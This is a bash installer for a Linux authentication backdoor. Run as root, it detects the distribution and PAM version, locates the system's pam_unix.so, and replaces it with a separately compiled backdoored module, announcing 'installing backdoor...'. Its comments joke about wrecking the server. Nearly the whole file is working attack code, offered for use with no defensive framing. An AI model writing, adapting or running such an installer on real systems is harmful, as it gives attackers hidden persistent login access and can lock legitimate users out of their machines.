#!/usr/bin/env bash

set -e

trap "exit" INT

RED='\033[0;91m'
GREEN='\033[0;92m'
BLUE='\033[0;94m'
MAGENT='\033[0;95m'
NC='\033[0m'

OPTIND=1
DETERMINEFLAG=1
function determine_os {
	if [ -f "/etc/debian_version" ] ; then
		echo -e "${GREEN}[+]${NC} Debian-based distribution detected."
		PAM_VERSION=$(dpkg -l | grep libpam-modules-bin | sed -nre 's/^[^1]*(([0-9]+\.)*[0-9]+).*/\1/p')
	## rest is just an OS detection algorithm. actual detection TBD.
	elif lsb_release -d | grep -q "Fedora"; then
		echo -e "${GREEN}[+]${NC} Fedora distribution detected."
		## todo
	elif lsb_release -d | grep -q "Arch"; then
		echo -e "${GREEN}[+]${NC} Arch distribution detected."
		PAM_VERSION=$(pacman -Ss | grep -w "core/pam" | sed -nre 's/^[^1]*(([0-9]+\.)*[0-9]+).*/\1/p')
	elif lsb_release -d | grep -q "CentOS"; then
		echo -e "${GREEN}[+]${NC} CentOS distribution detected."		
		## todo
	elif lsb_release -d | grep -q "Manjaro"; then
		echo -e "${GREEN}[+]${NC} Manjaro distribution detected."		
		PAM_VERSION=$(pacman -Ss | grep -w "core/pam" | sed -nre 's/^[^1]*(([0-9]+\.)*[0-9]+).*/\1/p')
	elif uname | grep -q "Darwin"; then
		echo -e "${RED}[-]${NC} Mac OS X detected."
		## todo
	else		
		echo -e "${RED}[-]${NC} unknown distribution, work in progress."
	fi;
	## would be cool to add %name%-based distribution gradation like Debian-based.
}

function show_help {
	echo ""
	echo -e "${BLUE}[?]${NC} just run it and let the magic happen"
	echo ""
}
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[-]${NC} are you kidding me? this script MUST be run as root." 
   exit 1
fi
while getopts ":h?:n?" opt; do
    case "$opt" in
    h|\?)
        show_help
        exit 0
        ;;
    n)	DETERMINEFLAG=0
		;;
    esac
done

shift $((OPTIND-1))

[ "$1" = "--" ] && shift

echo ""
if [ $DETERMINEFLAG != 0 ]; then
determine_os
else
echo -e "${BLUE}[*]${NC} PAM version detector disabled."
echo ""
fi;
if [ -z $PAM_VERSION ]; then 
	echo ""
	printf "${RED}[-]${NC} automatic PAM version detection failed. please specify it manually: " && read -r PAM_VERSION
fi;
if [ ! -f "./pam_unix-$PAM_VERSION.so" ]; then
	echo ""
	echo -e "${RED}[-]${NC} no pam_unix-$PAM_VERSION.so file, compile it first."
	echo ""
	exit 1
fi; 
echo ""
echo -e "${GREEN}[+]${NC} PAM version: $PAM_VERSION"
echo ""
PWN2OWN=$(find / -name "pam_unix.so" | grep security)
if [ -z PWN2OWN ]; then
echo -e "${RED}[-]${NC} something went wrong, no pam_unix.so detected." 
else
URDEAD=1
while read -r deadlist; do
  echo -e "${BLUE}[${NC}$URDEAD${BLUE}]${NC} $deadlist"
  ((URDEAD++))
done <<< "$PWN2OWN"
((URDEAD--))
echo ""
printf "${GREEN}[+]${NC} select a path to pam_unix if many: "
read -r own2pwn
if [[ `seq 1 $URDEAD` =~ $own2pwn ]]; then
  deadbeef=$(sed -n "${own2pwn}p" <<< "$PWN2OWN") 
## i dont know what the fuck is going on here, im crunked.
echo -e "${GREEN}[+]${NC} installing backdoor..."
cp ./pam_unix-$PAM_VERSION.so $deadbeef
	if [ -f "/etc/debian_version" ] ; then
		echo -e "${GREEN}[+]${NC} chmodding for Debian-based..."
		chmod 644 $deadbeef
	else
		echo -e "${GREEN}[+]${NC} chmodding for Arch-based..."
		chmod 755 $deadbeef
		## rest in peace good ol' server. no one will be able to log into you again.
	fi;
echo -e "${GREEN}[+]${NC} installed. should be ok to login now."
fi;
fi;